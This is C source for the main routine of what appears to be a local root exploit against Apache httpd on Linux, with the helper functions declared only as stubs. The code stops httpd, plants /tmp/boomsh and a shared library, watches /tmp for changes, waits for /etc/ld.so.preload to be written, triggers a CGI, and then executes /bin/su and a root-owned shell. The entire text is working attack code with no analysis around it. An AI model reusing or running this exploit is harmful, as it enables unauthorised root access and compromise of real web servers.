
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct stat {scalar_t__ st_size; scalar_t__ st_uid; } ;
typedef int st ;


 int DN_ACCESS ;
 int DN_ATTRIB ;
 int DN_CREATE ;
 int DN_DELETE ;
 int DN_MODIFY ;
 int DN_MULTISHOT ;
 int DN_RENAME ;
 int F_NOTIFY ;
 int F_SETSIG ;
 int O_DIRECTORY ;
 int O_RDONLY ;
 int SIGUSR1 ;
 int create_boomsh () ;
 int create_boomso () ;
 int execve (char*,char**,char**) ;
 int exit (int) ;
 scalar_t__ fcntl (int,int ,int) ;
 scalar_t__ fork () ;
 int memset (struct stat*,int ,int) ;
 int open (char*,int) ;
 int printf (char*) ;
 int scan_proc () ;
 int setbuffer (int ,int *,int ) ;
 int sig_x ;
 int signal (int,int ) ;
 int sleep (int) ;
 scalar_t__ stat (char*,struct stat*) ;
 int stdout ;
 char* strdup (char*) ;
 int system (char*) ;
 int trigger_cgi (char*) ;
 int usage () ;

int main(int argc, char **argv)
{
 int fd;
 struct stat st;
 char *cgi = ((void*)0);
 extern char **environ;
 char *boomsh[] = {"/tmp/boomsh", ((void*)0)};
 char *suid[] = {"/bin/su", ((void*)0)};

 if (argc < 2)
  usage();

 cgi = strdup(argv[1]);

 setbuffer(stdout, ((void*)0), 0);

 system("killall -STOP httpd");

 create_boomsh();
 create_boomso();

 if ((fd = open("/tmp", O_RDONLY|O_DIRECTORY)) < 0) {
  return -1;
 }

 if (fcntl(fd, F_SETSIG, SIGUSR1) < 0) {
  return -1;
 }

 if (fcntl(fd, F_NOTIFY, DN_MODIFY|DN_DELETE|DN_RENAME|DN_ATTRIB
          |DN_CREATE|DN_MULTISHOT|DN_ACCESS) < 0) {
  return -1;
 }

 signal(SIGUSR1, sig_x);

 printf("Installed signal-handler. Waiting for apache restart.\n");


 while (stat("/etc/ld.so.preload", &st) < 0)
  sleep(1);



 scan_proc();


 trigger_cgi(cgi);

 for(;;) {
  sleep(1);
  memset(&st, 0,sizeof(st));
  stat("/etc/ld.so.preload", &st);
  if (st.st_size > 0)
   break;
  if (stat("/tmp/boomsh", &st) == 0 && st.st_uid == 0)
   break;
 }


 if (fork() == 0) {
  execve(*suid, suid, ((void*)0));
  exit(1);
 }
 sleep(3);
 execve(*boomsh, boomsh, environ);

 return 0;
}
